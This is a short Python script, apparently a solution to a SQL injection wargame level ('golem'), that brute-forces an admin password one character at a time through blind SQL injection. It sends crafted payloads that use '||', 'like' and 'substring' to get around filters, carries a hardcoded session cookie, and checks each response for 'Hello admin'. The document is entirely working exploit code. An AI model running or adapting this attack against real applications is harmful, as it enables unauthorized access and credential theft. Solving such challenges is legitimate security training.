import urllib.request
from urllib.parse import quote

key = ""
for i in range(1, 9):
    for j in range(48, 127):
        url = "http://los.eagle-jump.org/golem_39f3348098ccda1e71a4650f40caa037.php?pw="
        data = "' || id like 'admin' && substring(pw,1,{}) like '{}'#".format(str(i), key + chr(j))
        print(data)
        data = quote(data)
        re = urllib.request.Request(url + data)
        re.add_header("User-agent", "Mozilla/5.0") 
        re.add_header("Cookie", "PHPSESSID=6ckrsnfovcd74972o80ugmksb4")
        res = urllib.request.urlopen(re) 
        if str(res.read()).find("Hello admin") != -1:
            key += chr(j).lower()
            print(key)
            break
print(key)